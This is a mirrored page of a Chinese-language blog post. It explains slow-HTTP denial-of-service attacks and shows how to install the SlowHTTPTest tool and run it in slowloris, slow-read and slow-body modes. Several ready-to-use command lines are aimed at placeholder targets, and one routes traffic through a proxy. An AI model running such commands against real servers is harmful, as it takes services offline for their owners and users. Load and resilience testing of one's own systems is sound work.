@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/SlowHTTPTest-dos-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:46:55 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>SlowHTTPTest-慢速DoS攻击</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。
+
+" />
+    <meta property="og:description" content="Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="SlowHTTPTest-慢速DoS攻击" />
+    <meta property="twitter:title" content="SlowHTTPTest-慢速DoS攻击" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>SlowHTTPTest-慢速DoS攻击</h1>
+
+  <div class="entry">
+    <p>Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。</p>
+
+<p>SlowHTTPTest是一款对服务器进行慢攻击的测试软件，所谓的慢攻击就是相对于cc或者DDoS的快而言的，并不是只有量大速度快才能把服务器搞挂，使用慢攻击有时候也能到达同一效果。slowhttptest包含了之前几种慢攻击的攻击方式，包括slowloris, Slow HTTP POST, Slow Read attack等。那么这些慢攻击工具的原理就是想办法让服务器等待，当服务器在保持连接等待时，自然就消耗了资源。</p>
+
+<p>Slowhttptest的源码托管在Github：<a href="https://github.com/shekyan/slowhttptest">https://github.com/shekyan/slowhttptest</a></p>
+
+<h2 id="在kali-linux上安装slowhttptest">在Kali Linux上安装SlowHTTPTest</h2>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># apt-get install slowhttptest </span></code></pre></figure>
+
+<p>如果你使用其他linux发行版，可以从源码编译安装：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="gp">$ </span>./configure
+<span class="gp">$ </span>make
+<span class="gp">$ </span>sudo make install</code></pre></figure>
+
+<h2 id="使用示例">使用示例</h2>
+
+<p>man手册：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># man slowhttptest</span></code></pre></figure>
+
+<p>帮助信息中提供了很多使用示例。</p>
+
+<h3 id="slowloris模式">slowloris模式：</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3</span></code></pre></figure>
+
+<p><img src="../images/2016/5/Screen%20Shot%202016-05-28%20at%2018.18.13.png" alt="SlowHTTPTest: 慢速DoS攻击" /></p>
+
+<p>生成图表(CSV和html格式)：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3</span></code></pre></figure>
+
+<h3 id="slow-read模式">Slow Read模式：</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://yourtarget.com -p 5 -l 350 -e x.x.x.x:8080</span></code></pre></figure>
+
+<p>x.x.x.x:8080是HTTP代理</p>
+
+<hr />
+
+<h3 id="实际测试">实际测试</h3>
+
+<p>Slow Body攻击：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://www.mywebsite.com -x 10 -p 3</span></code></pre></figure>
+
+<p>攻击开始，服务器端在几秒内的变化：</p>
+
+<p><img src="../images/2016/5/Screen%20Shot%202016-05-28%20at%2018.29.22.png" alt="SlowHTTPTest: 慢速DoS攻击" /></p>
+
+  </div>
+
+  <div class="date">
+    Written on May 28, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/SlowHTTPTest-dos-attack/',
+		  'title': 'SlowHTTPTest-慢速DoS攻击'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/SlowHTTPTest-dos-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:46:59 GMT -->
+</html>
